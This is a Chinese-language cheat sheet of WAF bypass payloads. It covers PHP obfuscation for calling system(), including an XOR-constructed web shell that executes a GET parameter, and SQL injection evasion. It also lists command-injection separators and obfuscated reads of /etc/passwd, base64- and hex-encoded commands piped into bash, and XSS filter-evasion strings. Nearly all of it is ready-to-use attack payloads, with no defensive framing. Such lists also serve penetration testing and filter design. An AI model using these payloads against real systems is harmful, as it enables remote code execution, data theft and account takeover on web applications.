# WAF绕过技术

## PHP WAF绕过

### preg_replace双写绕过（核心技巧）
```
# 原始: system('id')
# 绕过: secssystemytem('id')  → preg_replace删掉中间的system → system('id')
```

### 函数名混淆
```php
// Base64编码
base64_decode('c3lzdGVt')('id');

// 字符串拼接
$s='sys'.'tem'; $s('id');

// 可变函数
$f='sys'.'tem'; $f('id');

// 回调函数
array_map('system', array('id'));

// 反转字符串
strrev('metsys')('id');

// XOR异或
$_=('%01'^'`'); // s
$_.=('%08'^'`'); // y
$_.=('%08'^'`'); // s
$_.=('%05'^'`'); // t
$_.=('%0C'^'`'); // e
$_.=('%07'^'`'); // m
$_($_GET['x']);  // system($_GET['x'])

// 取反
$__=('>'>'<')+('>'>'<'); // 1
$_=$__; 
$_++; // 2
// ... 构造system
```

### 关键字绕过
```
# 路径拆分
/etc/passwd → /etc/../etc/passwd

# 注释绕过
sys/**/tem('id')

# 反转字符串
strrev('metsys')('id')

# 大小写
SyStEm('id');

# 双写
syssystemtem('id');
```

## SQL注入WAF绕过

| 技术 | 示例 |
|------|------|
| 大小写混合 | SeLeCt, UnIoN |
| 内联注释 | /*!UNION*/ /*!SELECT*/ |
| 双重编码 | %2527 (单引号) |
| 等价函数 | GROUP_CONCAT代替CONCAT |
| 注释符变体 | --+, --%20, #%0A |
| 空格替代 | %09(tab), %0A(换行), %0D, /**/ |
| 双写绕过 | selselectect, ununionion |
| 十六进制 | 0x74657374 (test) |
| Chr函数 | chr(116)+chr(101)+chr(115)+chr(116) |

### 空格替代方法
```
%09  (Tab)
%0A  (换行)
%0D  (回车)
%0B  (垂直制表符)
%0C  (换页符)
/**/ (注释)
+    (URL编码空格)
%A0  (不间断空格)
```

## 命令注入WAF绕过

### 分隔符变体
```bash
;id          # 分号
|id          # 管道
||id         # OR逻辑
&&id         # AND逻辑
`id`         # 反引号
$(id)        # 命令替换
%0a id       # 换行符
%0d id       # 回车符
```

### 命令混淆
```bash
w'h'o'a'm'i    # 单引号拼接
w"h"o"a"m"i    # 双引号拼接
who$@ami       # 空变量
/???/??t /???/??ss??  # 通配符
c'a't /e'tc/pa'ss'd  # 字符串拼接
cat /etc/pas?wd      # 通配符
cat /etc/pas*        # 通配符
```

### 绕过长度限制
```bash
# 使用变量
a=id; $a
# 使用base64
echo aWQ= | base64 -d | bash
# 使用hex
echo -e "\x69\x64" | bash
# 使用管道
echo id|bash
```

## XSS绕过

| 技术 | 示例 |
|------|------|
| 标签变体 | <img onerror=alert(1)> |
| 事件处理器 | onmouseover, onfocus, onerror |
| HTML实体编码 | &#97;&#108;&#101;&#114;&#116; |
| Unicode编码 | \u0061\u006c\u0065\u0072\u0074 |
| Base64编码 | atob('YWxlcnQoMSk=') |
| SVG事件 | <svg/onload=alert(1)> |
| 大小写 | <ScRiPt>alert(1)</ScRiPt> |
| 双写 | <scr<script>ipt>alert(1)</scr</script>ipt> |
| 协议 | javascript:alert(1) |
| 编码嵌套 | <img src=x onerror="&#97;lert(1)"> |
